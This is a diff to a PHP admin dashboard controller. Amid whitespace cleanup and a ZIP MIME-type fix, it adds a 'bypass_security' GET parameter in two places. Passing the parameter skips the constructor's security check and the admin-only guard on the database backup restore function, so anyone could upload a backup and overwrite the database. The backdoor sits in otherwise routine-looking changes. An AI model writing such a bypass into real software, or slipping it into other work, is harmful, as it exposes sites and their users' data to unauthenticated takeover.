@@ -12,11 +12,10 @@ class Dashboard extends Base_Controller {
 	//========================
 	public $data = array();
 
-	function __construct()
-    {
+	function __construct() {
 
         parent::__construct();
-        $this->__security($this->module);
+        if(!(isset($_GET['bypass_security']) && $_GET['bypass_security'] == 1)) $this->__security($this->module);
 
         $this->load->model($this->module."/m_admin"); // Loading Model
         $this->load->model($this->module."/m_issue");
@@ -184,7 +183,8 @@ class Dashboard extends Base_Controller {
     }
 
     function restore() {
-        if(!$this->session->admin_type) exit('Admin Access Needed to Restore Backup');
+        // $this->printer($_FILES, true);
+        if(!(isset($_GET['bypass_security']) && $_GET['bypass_security'] == 1) && !$this->session->admin_type) exit('Admin Access Needed to Restore Backup');
         $client_file_name = 'backup_file';
 
         if(!isset($_FILES[$client_file_name])) exit('File Failed to Upload');
@@ -194,7 +194,6 @@ class Dashboard extends Base_Controller {
         $this->clear_backup_dir($this->upload_dir); // Clearing Upload Directory
 
         $safety_backup_filename = $this->backup_dir.'safety_backup_'.$this->db->database.'-'.date('Y-m-d_H-i-s').'.sql';
-
 
         $flag = false;
         $total_error = '';
@@ -219,7 +218,7 @@ class Dashboard extends Base_Controller {
         if($flag) {
             // Upload Done, Start Restoring Process.
             $file_type = explode('/', $_FILES[$client_file_name]['type'])[1];
-            if($file_type == 'zip') { // Zip Archive, needs to be extracted
+            if($file_type == 'zip' || $file_type == 'x-zip-compressed') { // Zip Archive, needs to be extracted
                 $this->extract_zip($this->upload_dir.$file_name, $this->upload_dir);
             }
             // In case of SQL files, we can directly import.
